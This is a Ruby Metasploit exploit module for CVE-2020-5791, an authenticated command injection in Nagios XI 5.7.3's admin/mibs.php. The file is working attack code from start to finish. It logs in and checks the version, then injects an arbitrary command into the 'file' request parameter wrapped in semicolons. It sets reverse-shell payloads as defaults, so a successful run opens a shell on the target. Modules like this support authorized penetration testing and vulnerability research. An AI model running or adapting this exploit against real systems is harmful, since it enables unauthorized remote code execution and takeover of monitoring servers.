##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nagios XI 5.7.3 - Mibs.php Authenticated Remote Code Exection',
        'Description' => %q{
          This module exploits an OS command injection vulnerability in `admin/mibs.php`
          that enables an authenticated user with admin privileges to achieve remote
          code execution as the `apache` user.

          Valid credentials for a Nagios XI admin user are required. This module has
          been successfully tested against Nagios XI 5.7.3 running on CentOS 7.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Chris Lyne', # discovery
            'Matthew Aberegg', # PoC
            'Erik Wynter' # @wyntererik - Metasploit'
          ],
        'References' =>
          [
            ['CVE', '2020-5791'],
            ['EDB', '48959']
          ],
        'Platform' => %w[linux unix],
        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD],
        'Targets' =>
          [
            [
              'Linux', {
                'Arch' => [ARCH_X86, ARCH_X64],
                'Platform' => 'linux',
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'CMD', {
                'Arch' => [ARCH_CMD],
                'Platform' => 'unix',
                # the only reliable payloads against a typical Nagios XI host (CentOS 7 minimal) seem to be cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl
                'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl_ssl' }
              }
            ]
          ],
        'Privileged' => false,
        'DisclosureDate' => '2020-10-20',
        'DefaultTarget' => 0
      )
    )

    register_options [
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])
    ]
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def check
    # obtain cookies required for authentication
    cookies = nagios_xi_login(username, password)
    if cookies.instance_of? Msf::Exploit::CheckCode
      return cookies
    end

    # authenticate and obtain the Nagios XI version
    print_good('Successfully authenticated to Nagios XI')
    version = nagios_xi_version_index(cookies)
    if version.instance_of? Msf::Exploit::CheckCode
      return version
    end

    print_status("Target is Nagios XI with version #{version}")

    # check if the target is actually vulnerable
    unless version == '5.7.3'
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def execute_command(cmd, _opts = {})
    # execute payload
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'mibs.php'),
      'vars_get' =>
      {
        'mode' => 'undo-processing',
        'type' => '1',
        'file' => ";#{cmd};"
      }
    }, 0) # don't wait for a response from the target, otherwise the module will in most cases hang for a few seconds after executing the payload
  end

  def exploit
    if target.arch.first == ARCH_CMD
      print_status('Executing the payload')
      execute_command(payload.encoded)
    else
      execute_cmdstager(background: true)
    end
  end
end
